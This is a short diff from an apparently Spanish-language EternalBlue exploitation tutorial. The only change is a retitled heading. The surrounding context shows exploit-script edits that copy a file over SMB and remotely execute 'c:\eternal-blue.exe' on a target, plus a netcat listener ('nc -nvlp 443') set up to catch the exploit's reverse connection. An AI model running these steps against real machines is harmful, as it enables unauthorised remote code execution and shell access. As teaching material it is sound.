@@ -199,7 +199,7 @@ smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') -> smb_send_file(smbConn
 service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt') -> service_exec(conn, r'cmd /c c:\eternal-blue.exe')
 ```
 
-# Explotando Vulnerabilidades
+# Explotación de Vulnerabilidades
 Una vez ya listo el Exploit y siguiendo en el entorno virtual, vamos a activar una **netcat** que es ahí donde se conectara el Exploit y luego activamos el Exploit:
 ```
 nc -nvlp 443
